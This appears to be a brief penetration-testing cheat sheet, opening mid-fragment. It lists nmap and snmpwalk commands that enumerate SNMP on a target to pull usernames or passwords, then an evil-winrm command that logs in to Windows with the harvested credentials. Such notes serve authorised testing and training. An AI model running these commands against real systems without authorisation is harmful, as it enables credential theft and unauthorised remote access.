`- `This will give you the username password or any hint for login`

# Commands 

### Enummeration
```bash
# Scan UDP 161 with SNMP scripts
nmap -sU -p161 --script "snmp-*" <IP>

# Scan SNMP ports 161,162 with version and process/netstat scripts
nmap -n -vv -sV -sU -Pn -p161,162 --script=snmp-processes,snmp-netstat <IP>

# SNMP walk to get extended info (look for usernames/passwords)
snmpwalk -v1 -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```
### Connect
```bash
# Use found creds to login to Windows via WinRM
evil-winrm -i <IP> -u 'username' -p 'password'
```
